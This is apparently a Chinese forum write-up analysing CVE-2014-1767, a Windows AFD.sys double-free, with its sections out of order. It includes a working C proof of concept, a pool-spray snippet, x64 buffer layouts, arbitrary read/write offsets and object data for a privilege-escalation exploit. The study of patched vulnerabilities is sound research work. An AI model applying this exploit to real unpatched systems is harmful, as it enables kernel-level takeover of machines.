
2. 因为对象与结构体大小导致的第一次释放占坑问题

3. 内存大小问题导致的第二次占坑成功率问题

4. 任意地址读写的偏移问题

5. 64位中清理句柄的问题

## 解决

1. `WorkerFactory`在64位中大小为`0x100`，可以通过前面的分析步骤来分析，我在外文PDF中看到他说了是`0x100`（经过一番跟踪，确实是`0x100`）

`MDL`结构的大小，64位中头部大小为`0x30`，PFN数组大小还是按照之前分析的结果，只不过是一个元素占8字节

2. 既然知道了需要构造的mdl结构的大小，那么按照之前的流程构造即可正常占坑

3. 64位系统中内存过大，导致占坑成功率低，之前分析的过程中发现，`AFD`貌似使用自己初始化的`Lookaside List`，所以双重释放应该是没问题的，问题是释放到pool中后，能否在`NtQueryEaFile`中成功占坑这个内存（外文PDF中使用`gdi32.CreateRoundRectRgn`消耗内存，py版的代码如下）

```py
rgnarr = []
nBottomRect = 0x2aaaaaa
while(1):
hrgn = windll.gdi32.CreateRoundRectRgn(0,0,1,nBottomRect,1,1)
if hrgn == 0:
break
rgnarr.append(hrgn)
```

这是老外使用的py poc中的代码，我不知道这个对象的大小是如何计算的，`0x2aaaaaa`应该是老外计算后觉得比较合适的数字

4. 经过前面32位的分析，我们知道，如果对象大小与结构大小改变了，那么它的各种寻址偏移也将会改变，但是它的功能不会变化，只需要重新分析对应的64位内核的函数得到任意读写的构造公式

5. 最后提权结束，需要清理句柄，除了地址变为8字节，别的应该是一样的

6. 外文pdf中应该是以win8 wow64进程来进行描述的，他提到了绕过ASLR SMEP 与 重定向问题 ，由于我们现在有未公开函数来获取基址，所以不用考虑ASLR（但是也是值得研究的，三环也常用信息泄露来获取基址），SMEP的话需要构造ROP，在win8中只需要构造一次（具体可参考外文PDF）

## 64位的逆向分析

**对照32位的分析位置，快速定位即可**

1. 第一个inputbuf构造，构造要求跟之前一样，大小变为`0x40`，同时分析过程要注意大小

```c
buf1length >= 0x40;
buf1[0x20] = VA; //qword值
buf1[0x28] = length; //dword值
buf1[0x3C] = 1; //dword值
```

2. 第二个inputbuf构造

```c
buf2length >= 0x18;
buf2[0x0] = 1; //dword值
buf2[0x8] <= 0xAAAAAAA ;//dword值
```

3. 覆盖第二次释放内存的构造，跟之前不一样的是，没有+4的操作了，所以可以直接使用对象大小，无需-4

4. 任意读的构造，`\*(\*(object+0x80)+0x180)` , 返回大小`0x78` ，别的跟之前一样

5. 任意写的构造，`\*(\*(\*object + 0x18) + 0x2C) = \*(DWORD\*)arg3` ，别的跟之前一样，这里要写两次，才能写入8字节的地址

这里值得注意的是，64位的那个set函数，加了一个switch case ，我们需要的写操作在 case 8 ，另外由于只能写入4字节，但是`\*object`与` \*arg3`都是我们可控的，所以第二次写的时候，调整`\*object`中的数据与`\*arg3`的数据即可

6. 对象头大小为`0x30`，前面的创建信息大小为`0x20`，body大小为`0xB0` ，刚好`0x100` ，没问题，数据我已经拷出来了

我大概分析了一下，除了对象头的引用计数和类型，别的貌似都没用到，最后也不会释放它，所以给几个重要的值就行

```
pool头为0x10
创建信息为0x20
对象头为0x30
body为0xB0
body前面的数据，挑重要的拷贝到对象头中
00 00 00 00 08 01 00 00-00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00-08 31 92 31 80 fa ff ff
01 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00-16 00 08 01 00 00 00 00
e0 51 83 32 80 fa ff ff-00 00 00 00 00 00 00 00
```

7. 到此为止，我们的64位EXP应该可以编写了，最后句柄清理的步骤，对应的数据改为64位的相关结构即可

8. 64位的POC，只需要参考1与2即可，别的都一样

9. EXP的编写，只需把重要部分改为上述分析中的内容即可

# 提权成功

x64提权成功且不蓝 perfect！

![](upload/attach/202205/930159_EMTVHC7RFXM2ZXB.png)

# 补丁分析

我这没有打过补丁的系统，就不折腾了，微软修复方案是在 `AfdReturnTpinfo`中 第一次释放mdl后，把那个结构体的 index清0，这样就不会调用第二次free了（我称它为index，资料中称它为TpInfoElementCount，可能是因为它曾与那个AfdTpInfoElementCount全局变量比较后进行申请内存的动作吧）

**吐槽：**补丁分析主要还是用来研究Nday之类的东西，查看修复方案，逆向分析它之前可能存在什么漏洞，这才是主要的。不然我看它怎么修复的有什么意义。。

# 结语

1. 对于新手来说，这个漏洞还是很值得去学习一下的

2. 相信终有一天，外国人也需要研究咱们中国的文章与资料（逆向人加油）

3. 不知不觉一万多字了，希望可以真正帮助到新手，二进制漏洞的世界，对新手确实太不友好了

4. `EXP_x64`在附件中，需要测试可自行下载

# 参考资料

1. [Vsbat大佬的文章](https://bbs.pediy.com/thread-194457.htm)

2. 外文PDF

# 前言

我是逆向练习生，羽墨

我正在从0开始学习二进制漏洞，如果你也跟我一样，不妨来看看小白的第一视角

这是我第一个研究的漏洞，虽然已经有相当多的资料与文章对这个漏洞进行了分析，但是大部分都是（ctrlCV你懂的），参考了前人的资料，给出了还不如前人的分析文章，让我这个纯纯的新手感觉到困难重重，所以我想把我的分析与思考的过程分享给大家，希望可以帮助到像我一样的菜鸟们（qaq）

**同时也是向那些无私奉献的大佬们致敬！**

---

# 概述

在2014年的Pwn2Own黑客大赛上，Siberas安全团队利用`CVE-2014-1767` Windows `AFD.sys` 双重释放漏洞进行内核提权，以此绕过windows8.1 平台上的IE11沙箱，随后该漏洞因此获得2014年黑客奥斯卡的“最佳提权漏洞奖”

# 影响版本

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12 | `Windows` `8.1`  `Windows` `8`  `Windows` `7`  `Windows Vista`  `Windows XP`  `Windows Server` `2012` `R2`  `Windows Server` `2012`  `Windows Server` `2008` `R2`  `Windows Server` `2008`  `Windows Server` `2003`  `Windows RT`  `Windows RT` `8.1` |

# 实验环境

| 软件 | 版本 |
| --- | --- |
| Vmware | win7x86 sp1 |
| Vmware | win7x64 sp1 |
| windbg | windbg10.0 |
| x64dbg | release版本 |
| IDA | IDA 7.5 |

# POC

将以下代码编译，我使用VS2019，编译后在win7x86 SP1的虚拟机上运行，蓝屏崩溃

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39 | `#include <stdio.h>`  `#include <WinSock2.h>`  `#include <WS2tcpip.h>`  `#pragma comment(lib,"Ws2_32.lib")`    `int` `main()`  `{`  `DWORD targetSize` `=` `0x310``;`  `DWORD virtualAddress` `=` `0x13371337``;`  `DWORD mdlSize` `=` `(``0x4000` `*` `(targetSize` `-` `0x30``)` `/` `8``)` `-` `0xFFF` `-` `(virtualAddress &` `0xFFF``);`  `static DWORD inbuf1[``100``];`  `memset(inbuf1,` `0``, sizeof(inbuf1));`  `inbuf1[``6``]` `=` `virtualAddress;`  `inbuf1[``7``]` `=` `mdlSize;`  `inbuf1[``10``]` `=` `1``;`  `static DWORD inbuf2[``100``];`  `memset(inbuf2,` `0``, sizeof(inbuf2));`  `inbuf2[``0``]` `=` `1``;`  `inbuf2[``1``]` `=` `0x0AAAAAAA``;`  `WSADATA WSAData;`  `SOCKET s;`    `SOCKADDR_IN sa;`  `int` `ierr;`  `WSAStartup(``0x2``, &WSAData);`  `s` `=` `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);`  `memset(&sa,` `0``, sizeof(sa));`  `sa.sin_port` `=` `htons(``135``);`  `sa.sin_addr.S_un.S_addr` `=` `inet_addr(``"127.0.0.1"``);`  `sa.sin_family` `=` `AF_INET;`  `ierr` `=` `connect(s, (const struct sockaddr``*``)&sa, sizeof(sa));`  `static char outBuf[``100``];`  `DWORD bytesRet;`  `DeviceIoControl((HANDLE)s,` `0x1207F``, (LPVOID)inbuf1,` `0x30``, outBuf,` `0``,`  `&bytesRet, NULL);`  `DeviceIoControl((HANDLE)s,` `0x120C3``, (LPVOID)inbuf2,` `0x18``, outBuf,` `0``,`  `&bytesRet, NULL);`  `return` `0``;`  `}` |

# BSOD信息

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38 | `The current thread` `is` `making a bad pool request.  Typically this` `is` `at a bad IRQL level` `or` `double freeing the same allocation, etc.`  `Arguments:`  `Arg1:` `00000007``, Attempt to free pool which was already freed` `/``/``尝试释放已释放的池`  `Arg2:` `00001097``, Pool tag value` `from` `the pool header`  `Arg3:` `08bd0006``, Contents of the first` `4` `bytes of the pool header`  `Arg4:` `888aa318``, Address of the block of pool being deallocated`    `FREED_POOL_TAG:  Mdl`  `POOL_ADDRESS:` `888aa318` `Nonpaged pool`    `STACK_TEXT:`  `8fd8454c` `84720083` `00000003` `7b818ced` `00000065` `nt!RtlpBreakWithStatusInstruction`  `8fd8459c` `84720b81` `00000003` `888aa310` `000001ff` `nt!KiBugCheckDebugBreak``+``0x1c`  `8fd84960` `84762c6b` `000000c2` `00000007` `00001097` `nt!KeBugCheck2``+``0x68b`  `8fd849d8` `846cdec2` `888aa318` `00000000` `888ab6f0` `nt!ExFreePoolWithTag``+``0x1b1`  `8fd849ec` `8db8ceb0` `888aa318` `00000000` `8db6f89f` `nt!IoFreeMdl``+``0x70`  `8fd84a08` `8db6f8ac` `00000000` `00000001` `026e1e9f` `afd!AfdReturnTpInfo``+``0xad`  `8fd84a44` `8db70bba` `026e1e37` `000120c3` `8db70a8c` `afd!AfdTliGetTpInfo``+``0x89`  `8fd84aec` `8db752bc` `89c36640` `888a7708` `8fd84b14` `afd!AfdTransmitPackets``+``0x12e`  `8fd84afc` `84678593` `888a7708` `896c3790` `896c3790` `afd!AfdDispatchDeviceControl``+``0x3b`  `8fd84b14` `8486c99f` `89c36640` `896c3790` `896c386c` `nt!IofCallDriver``+``0x63`  `8fd84b34` `8486fb71` `888a7708` `89c36640` `00000000` `nt!IopSynchronousServiceTail``+``0x1f8`  `8fd84bd0` `848b63f4` `888a7708` `896c3790` `00000000` `nt!IopXxxControlFile``+``0x6aa`  `8fd84c04` `8467f1ea` `00000050` `00000000` `00000000` `nt!NtDeviceIoControlFile``+``0x2a`  `8fd84c04` `779070b4` `00000050` `00000000` `00000000` `nt!KiFastCallEntry``+``0x12a`  `0017f618` `77905864` `75cc989d` `00000050` `00000000` `ntdll!KiFastSystemCallRet`  `0017f61c` `75cc989d` `00000050` `00000000` `00000000` `ntdll!ZwDeviceIoControlFile``+``0xc`  `0017f67c` `75e9a671` `00000050` `000120c3` `00fb3588` `KERNELBASE!DeviceIoControl``+``0xf6`    `MODULE_NAME: afd`  `IMAGE_NAME:  afd.sys`    `0``: kd> lmvm afd`  `Browse full module` `list`  `start    end        module name`  `8db54000` `8dbae000`   `afd        (pdb symbols)`  `Loaded symbol image` `file``: afd.sys`  `Image path: \SystemRoot\system32\drivers\afd.sys` |

# 分析上述信息

1. 从上面的蓝屏信息可以看出， 这个POC触发了 `afd.sys`的双重释放漏洞，释放的是一个`MDL`对象，地址为非分页内存

2. `afd.sys` 是一个 winsock辅助驱动（百度可知）

3. POC中使用了一个初始化后的socket对象当作句柄，来调用到afd驱动中的例程，控制码为 `0x1207F` 与 `0x120C3` （一般调用驱动的流程为通过符号链接来得到句柄，这里直接传入socket，应该是经过操作过后的socket句柄在内核对应的对象中与直接创建的设备句柄有些不同，不然没必要进行这一步操作）

4. 调用堆栈中看出，通过`nt!ZwDeviceIoControlFile` 进入内核 ，调用到`afd`派遣例程`afd!AfdDispatchDeviceControl` ，然后调用到控制码对应的处理例程`afd!AfdTransmitPackets` ，之后触发蓝屏
